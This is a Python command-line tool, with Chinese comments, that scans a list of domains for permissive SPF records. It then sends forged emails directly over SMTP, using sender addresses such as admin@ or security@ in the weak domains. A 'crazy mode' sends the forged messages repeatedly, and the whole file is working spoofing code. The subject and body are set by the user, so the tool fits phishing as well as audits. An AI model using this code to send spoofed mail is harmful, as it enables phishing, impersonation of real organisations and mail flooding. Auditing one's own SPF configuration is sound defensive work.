import email.utils
import subprocess
import socket
import threading
import dns.resolver
import dns.exception
import argparse
import signal
import sys
import string
import os
import random
import time
import base64
import re
from urllib.parse import urlparse
from typing import List, Dict, Tuple, Optional

# 定义可能导致 SPF 漏洞的关键词
SPF_VULNERABILITY_KEYWORDS = {
    "+all": "严重漏洞: 使用了 '+all'，允许任何服务器发送邮件",
    "?all": "漏洞: 使用了 '?all'，没有严格的邮件服务器限制",
    "~all": "漏洞: 使用了 '~all'，软失败允许潜在伪造邮件通过",
}

# 全局变量
succ_num = failed_num = 0
quit_flag = print_flag = 1
threads_alive = []
Data = []
Lock = threading.Lock()
verbose = 2
crazy_mode = False

def PutColor(string, color):
    """为字符串添加颜色"""
    colors = {
        "gray": "2",
        "red": "31",
        "green": "32",
        "yellow": "33",
        "blue": "34",
        "pink": "35",
        "cyan": "36",
        "white": "37",
    }
    
    return f"\033[40;1;{colors.get(color, '37')};40m{string}\033[0m"
def process_domain_line(line: str) -> str:
    """处理文件中的行，提取域名部分"""
    line = line.strip()
    
    # 检查是否是URL格式
    if line.startswith(('http://', 'https://')):
        try:
            # 解析URL并提取域名部分
            parsed_url = urlparse(line)
            domain = parsed_url.netloc
            
            # 移除端口号（如果有）
            if ':' in domain:
                domain = domain.split(':')[0]
                
            Print(f"从URL {line} 中提取域名: {domain}", threshold=2, color="cyan")
            return domain
        except Exception as e:
            Print(f"解析URL {line} 时出错: {str(e)}", threshold=1, color="yellow")
            return line
    else:
        # 如果不是URL，直接返回
        return line
def Print(string, threshold=3, color="gray", sign="  [-]", flag=1, id=-1):
    """打印消息，支持颜色和详细级别控制"""
    global Data
    
    if verbose < threshold or (verbose == 0 and threshold > -1):
        if id != -1:
            Data[id] = PutColor(string, color)
        return
    
    str_color = "gray" if color == "gray" else "white"
    string = PutColor(sign, color) + PutColor(string, str_color)
    if verbose > 2 and threshold < 3 and flag:
        string = "  [-]" + string
    
    if Lock.acquire():
        print("\r" + string)
        Lock.release()

def Indicator(string, index=0):
    """生成动态指示器"""
    while any(threads_alive) and quit_flag and print_flag:
        index = (index + 1) % len(string)
        yield string[:index] + string[index].upper() + string[index+1:]

def superPrint():
    """显示超级打印界面"""
    global Data, verbose
    
    if verbose > 0:
        return
    
    Lock.acquire()
    
    try:
        _, fixed_length = os.popen('stty size', 'r').read().split()
        fixed_length = int(fixed_length)
    except:
        fixed_length = 80
    
    for index in Indicator("attacking..."):
        try:
            _, length = os.popen('stty size', 'r').read().split()
            length = int(length)
            if fixed_length > length:
                show_logo()
                fixed_length = length
        except:
            length = 80

        for i, data in enumerate(Data):
            print("\033[K\r%s%s" % (PutColor("No.%d: " % i, "white"),
                                    data if len(data) < length else data[:length-3]+"..."))

        print(PutColor("\r\033[K[%d]" % succ_num, "green") + PutColor(index, "white") + "\033[1A")
        print("\033[%dA" % (len(Data)+1))
        time.sleep(0.1)

    for i, data in enumerate(Data):
        print("\033[K\r%s%s" % (PutColor("No.%d: " % i, "white"),
                                data if len(data) < length else data[:length-3]+"..."))
    if not crazy_mode:
        print("")
    
    Lock.release()

def show_logo():
    print("--------------------------------------------")
    
def signal_handler(signum, frame):
    """处理中断信号"""
    global quit_flag, print_flag
    
    print_flag = 0
    Lock.acquire()
    Lock.release()
    print_flag = 1
    quit_flag = 0
    
    for i in Indicator("stopping..."):
        Print(i + "\033[1A", color="yellow", threshold=-1, flag=0, sign="\033[K[!]")
        time.sleep(0.1)

    Print("%s %s" % ("success:", succ_num), threshold=-1,
          color="green", flag=0, sign="\n"*(crazy_mode == True) + "\n[*]")
    Print("%s %s\n" % ("failed:", failed_num), threshold=-1, color="red", flag=0, sign="[!]")

    print("\033[?25h" + PutColor(random.choice([
        "Goodbye", "Have a nice day", "See you later",
        "Farewell", "Cheerio", "Bye",
    ]) + " :)", "white"))
    sys.exit()
def get_mx_record(domain):
    """获取域名的MX记录 - 使用dnspython版本"""
    try:
        # 使用dnspython查询MX记录
        answers = dns.resolver.resolve(domain, 'MX')
        
        if answers:
            # 按优先级排序并返回优先级最高的MX记录
            sorted_mx = sorted(answers, key=lambda x: x.preference)
            mx_record = str(sorted_mx[0].exchange).rstrip('.')
            Print(f"找到MX记录: {mx_record}", threshold=2, color="green")
            return mx_record
        else:
            Print(f"未找到 {domain} 的MX记录", threshold=1, color="yellow")
            return None
            
    except dns.resolver.NoAnswer:
        Print(f"没有找到 {domain} 的MX记录", threshold=1, color="yellow")
        return None
    except dns.resolver.NXDOMAIN:
        Print(f"域名 {domain} 不存在", threshold=0, color="red")
        return None
    except dns.resolver.Timeout:
        Print(f"查询 {domain} 的MX记录超时", threshold=0, color="red")
        return None
    except dns.exception.DNSException as e:
        Print(f"查询 {domain} 的MX记录时发生DNS错误: {str(e)}", threshold=0, color="red")
        return None
    except Exception as e:
        Print(f"查询 {domain} 的MX记录时发生未知错误: {str(e)}", threshold=0, color="red")
        return None
class SPFScanner:
    """SPF 漏洞扫描器"""
    
    def __init__(self):
        self.vulnerable_domains = []
    
    def check_spf_vulnerability(self, domain: str) -> Tuple[str, bool]:
        """检查单个域名的 SPF 漏洞 - 使用dnspython版本"""
        try:
            # 使用dnspython查询TXT记录
            answers = dns.resolver.resolve(domain, 'TXT')
            
            spf_record = None
            for rdata in answers:
                for txt_string in rdata.strings:
                    txt_str = txt_string.decode('utf-8', errors='ignore')
                    if "v=spf1" in txt_str:
                        spf_record = txt_str
                        break
                if spf_record:
                    break
            
            if spf_record:
                Print(f"找到SPF记录: {spf_record}", threshold=2, color="green")
                for keyword, message in SPF_VULNERABILITY_KEYWORDS.items():
                    if keyword in spf_record:
                        self.vulnerable_domains.append(domain)
                        return f"{domain}: {message}", True
                # 如果没有找到任何漏洞标志，认为 SPF 记录是相对安全的
                return f"{domain}: SPF记录看起来正常", False
            else:
                return f"{domain}: 没有SPF记录", False

        except dns.resolver.NoAnswer:
            return f"{domain}: 没有TXT记录", False
        except dns.resolver.NXDOMAIN:
            return f"{domain}: 域名不存在", False
        except dns.resolver.Timeout:
            return f"查询 {domain} 超时", False
        except dns.exception.DNSException as e:
            return f"DNS查询错误: {str(e)}", False
        except Exception as e:
            return f"发生错误：{str(e)}", False
    
    def scan_domains_from_file(self, file_path: str) -> List[str]:
        """从文件读取域名并扫描"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                domains = [process_domain_line(line) for line in file.readlines() if line.strip()]
            
            results = []
            for domain in domains:
                result, is_vulnerable = self.check_spf_vulnerability(domain)
                results.append(result)
                Print(result, threshold=1)
            
            return results
        except FileNotFoundError:
            Print(f"文件 {file_path} 未找到，请检查文件路径。", threshold=0, color="red")
            return []
class EmailTester:
    """邮件伪造测试器"""
    
    def __init__(self, to_addr: str, subject: str, body: str, smtp_user: str = None, smtp_pass: str = None):
        self.to_addr = to_addr
        self.subject = subject
        self.body = body
        self.smtp_user = smtp_user
        self.smtp_pass = smtp_pass
        self.quit_flag = 1
        self.succ_num = 0
        
        # 自动获取SMTP服务器地址
        to_domain = to_addr.split('@')[-1] if '@' in to_addr else to_addr
        self.smtp_server = get_mx_record(to_domain)
        if not self.smtp_server:
            Print(f"无法获取 {to_domain} 的MX记录，使用域名本身作为SMTP服务器", threshold=1, color="yellow")
            self.smtp_server = to_domain
    
    def generate_from_address(self, domain: str) -> str:
        """为指定域名生成常见的发件人地址"""
        # 常见的邮箱前缀列表
        common_prefixes = [
            "admin", "administrator", "webmaster", "info", "contact",
            "support", "service", "news", "newsletter", "noreply",
            "no-reply", "postmaster", "hostmaster", "abuse", "security"
        ]
        
        # 随机选择一个前缀，增加测试的随机性
        prefix = random.choice(common_prefixes)
        return f"{prefix}@{domain}"
    
    def connect_smtp(self, timeout: int = 10) -> Optional[socket.socket]:
        """连接到SMTP服务器"""
        try:
            Print(f"连接到 {self.smtp_server}:25 ", sign="[+]")
            sk = socket.socket()
            sk.settimeout(timeout)
            sk.connect((self.smtp_server, 25))
            
            # 接收欢迎消息
            data = sk.recv(1024).decode('utf-8', errors='ignore')
            Print(data, threshold=2, color="green", sign="<= ")
            
            if data.startswith('220'):
                return sk
            else:
                sk.close()
                return None
                
        except Exception as e:
            Print(f"连接到 {self.smtp_server}:25 失败: {str(e)}", threshold=0, color="red", sign="[X]")
            return None
    
    def send_command(self, sk: socket.socket, command: str, expected_code: str = "") -> Tuple[bool, str]:
        """发送SMTP命令并检查响应"""
        try:
            Print(command, threshold=2, color="yellow", sign="=> ")
            
            sk.sendall(f"{command}\r\n".encode('utf-8'))
            
            # 接收响应
            data = sk.recv(1024).decode('utf-8', errors='ignore')
            Print(data, threshold=2, color="green", sign="<= ")
            
            # 检查响应代码
            if expected_code and not data.startswith(expected_code):
                return False, data
            
            return True, data
            
        except Exception as e:
            Print(f"发送命令失败: {str(e)}", threshold=0, color="red", sign="[X]")
            return False, str(e)
    
    def send_auth_command(self, sk: socket.socket) -> Tuple[bool, str]:
        """发送 SMTP 身份验证命令"""
        try:
            # 发送 AUTH LOGIN 命令
            success, response = self.send_command(sk, "AUTH LOGIN", "334")
            if not success:
                return False, response
            
            # 发送用户名（Base64 编码）
            encoded_username = base64.b64encode(self.smtp_user.encode()).decode()
            success, response = self.send_command(sk, encoded_username, "334")
            if not success:
                return False, response
            
            # 发送密码（Base64 编码）
            encoded_password = base64.b64encode(self.smtp_pass.encode()).decode()
            success, response = self.send_command(sk, encoded_password, "235")
            if not success:
                return False, response
            
            return True, response
        except Exception as e:
            return False, str(e)
    
    def test_domain(self, domain: str, id: int = -1) -> bool:
        """对单个域名进行邮件伪造测试"""
        global succ_num, failed_num, quit_flag
        
        # 生成发件人地址
        from_addr = self.generate_from_address(domain)
        
        Print(f"测试域名: {domain}", sign="[+]")
        Print(f"发件人: {from_addr}", sign="  [*]")
        Print(f"收件人: {self.to_addr}", sign="  [*]")
        Print(f"SMTP服务器: {self.smtp_server}:25", sign="  [*]")
        
        # 连接到SMTP服务器
        sk = self.connect_smtp()
        if not sk:
            failed_num += 1
            return False
        
        try:
            # EHLO命令
            success, response = self.send_command(sk, f"EHLO {socket.gethostname()}", "250")
            if not success:
                failed_num += 1
                return False
            
            # 如果需要身份验证，发送AUTH命令
            if self.smtp_user and self.smtp_pass:
                success, response = self.send_auth_command(sk)
                if not success:
                    Print(f"SMTP身份验证失败: {response}", threshold=0, color="red", sign="[X]")
                    failed_num += 1
                    return False
            
            # MAIL FROM命令
            success, response = self.send_command(sk, f"MAIL FROM:<{from_addr}>", "250")
            if not success:
                failed_num += 1
                return False
            
            # RCPT TO命令
            success, response = self.send_command(sk, f"RCPT TO:<{self.to_addr}>", "250")
            if not success:
                failed_num += 1
                return False
            
            # DATA命令
            success, response = self.send_command(sk, "DATA", "354")
            if not success:
                failed_num += 1
                return False
            
            # 邮件内容
            email_content = f"""From: {from_addr}
To: {self.to_addr}
Subject: {self.subject}
Date: {email.utils.formatdate(localtime=True)}

{self.body}

随机ID: {''.join(random.choices(string.ascii_letters + string.digits, k=16))}
.
"""
            
            # 发送邮件内容
            sk.sendall(email_content.encode('utf-8'))
            
            # 检查发送结果
            data = sk.recv(1024).decode('utf-8', errors='ignore')
            Print(data, threshold=2, color="green", sign="<= ")
            
            if data.startswith('250'):
                Print("邮件发送成功", sign="[✓]")
                succ_num += 1
                self.succ_num += 1
                if id != -1:
                    Data[id] = PutColor(str(self.succ_num), "cyan")
                
                # QUIT命令
                self.send_command(sk, "QUIT", "221")
                return True
            else:
                Print(f"邮件发送失败: {data.strip()}", threshold=0, color="red", sign="[X]")
                failed_num += 1
                return False
                
        except Exception as e:
            Print(f"发送过程中发生错误: {str(e)}", threshold=0, color="red", sign="[X]")
            failed_num += 1
            return False
        finally:
            try:
                sk.close()
            except:
                pass
    
    def attack(self, domain: str, id: int = -1):
        """攻击循环"""
        global quit_flag, crazy_mode
        
        self.quit_flag = 1
        while quit_flag and self.quit_flag:
            if self.test_domain(domain, id):
                if not crazy_mode:
                    self.quit_flag = 0
                else:
                    time.sleep(random.random() * 1.5)
            else:
                if not crazy_mode:
                    self.quit_flag = 0
        
        Print("所有测试完成", sign="  [*]")
        if id >= 0 and id < len(threads_alive):
            threads_alive[id] = 0

def launcher(domains: List[str], to_addr: str, subject: str, body: str, smtp_user: str = None, smtp_pass: str = None):
    """启动测试"""
    global threads_alive, Data
    
    if verbose == 0:
        threading.Thread(target=superPrint).start()
    
    threads = []
    for i, domain in enumerate(domains):
        tester = EmailTester(to_addr, subject, body, smtp_user, smtp_pass)
        t = threading.Thread(target=tester.attack, args=(domain, i))
        t.start()
        threads.append(t)
        threads_alive.append(1)
        Data.append('0')
    
    if not crazy_mode:
        for t in threads:
            t.join()
    else:
        for i in Indicator("attacking..."):
            Print(i + "\033[1A", color="green", threshold=0, flag=0, sign="\033[K[%d]" % succ_num)
            time.sleep(0.1)

def main():
    global verbose, crazy_mode, threads_alive, Data
    
    # 配置DNS解析器
    try:
        # 设置DNS解析超时和重试
        dns.resolver.default_resolver = dns.resolver.Resolver()
        dns.resolver.default_resolver.timeout = 10
        dns.resolver.default_resolver.lifetime = 10
        dns.resolver.default_resolver.retry_attempts = 2
    except:
        Print("DNS解析器配置失败，使用默认配置", threshold=1, color="yellow")   
    # 注册信号处理
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # 解析命令行参数
    parser = argparse.ArgumentParser(description="SPF漏洞扫描与邮件伪造测试工具")
    parser.add_argument("-f", "--file", required=True, help="包含域名的文件路径")
    parser.add_argument("--to-addr", required=True, help="接收测试邮件的邮箱地址")
    parser.add_argument("--subject", default="安全测试邮件", help="邮件主题")
    parser.add_argument("--body", default="这是一封安全测试邮件，用于检测SPF漏洞。如非您本人操作，请忽略此邮件。", help="邮件内容")
    parser.add_argument("--test-all", action="store_true", help="测试所有域名，而不仅是有漏洞的域名")
    parser.add_argument("-v", "--verbose", type=int, default=1, choices=[0, 1, 2], help="详细程度 (0-2)")
    parser.add_argument("--smtp-user", help="SMTP 用户名（如果需要身份验证）")
    parser.add_argument("--smtp-pass", help="SMTP 密码（如果需要身份验证）")
    parser.add_argument("-c", "--crazy-mode", action="store_true", help="持续发送测试邮件")
    
    args = parser.parse_args()
    
    # 设置全局变量
    verbose = args.verbose
    crazy_mode = args.crazy_mode
    
    # 显示logo
    show_logo()
    
    # 第一步：扫描 SPF 漏洞
    Print("=" * 60, threshold=1)
    Print("开始 SPF 漏洞扫描", threshold=1)
    Print("=" * 60, threshold=1)
    
    scanner = SPFScanner()
    results = scanner.scan_domains_from_file(args.file)
    
    Print("=" * 60, threshold=1)
    Print("扫描完成", threshold=1)
    Print("=" * 60, threshold=1)
    
    vulnerable_count = len(scanner.vulnerable_domains)
    Print(f"发现 {vulnerable_count} 个存在 SPF 漏洞的域名", threshold=1)
    
    if vulnerable_count > 0:
        Print("存在漏洞的域名:", threshold=1)
        for domain in scanner.vulnerable_domains:
            Print(f"  - {PutColor(domain, 'red')}", threshold=1)
    
    # 第二步：邮件伪造测试
    Print("=" * 60, threshold=1)
    Print("开始邮件伪造测试", threshold=1)
    Print("=" * 60, threshold=1)
    
    # 确定要测试的域名
    test_domains = scanner.vulnerable_domains if not args.test_all else [
        line.strip() for line in open(args.file, 'r', encoding='utf-8', errors='ignore') if line.strip()
    ]
    
    if not test_domains:
        Print("没有找到需要测试的域名", threshold=1)
        return
    
    # 启动测试
    launcher(test_domains, args.to_addr, args.subject, args.body, args.smtp_user, args.smtp_pass)
    
    Print("=" * 60, threshold=1)
    Print("测试完成", threshold=1)
    Print("=" * 60, threshold=1)
    Print(f"成功发送测试邮件的域名: {PutColor(str(succ_num), 'green')}/{len(test_domains)}", threshold=1)
    Print(f"失败的测试: {PutColor(str(failed_num), 'red' if failed_num > 0 else 'green')}", threshold=1)

if __name__ == "__main__":
    main()
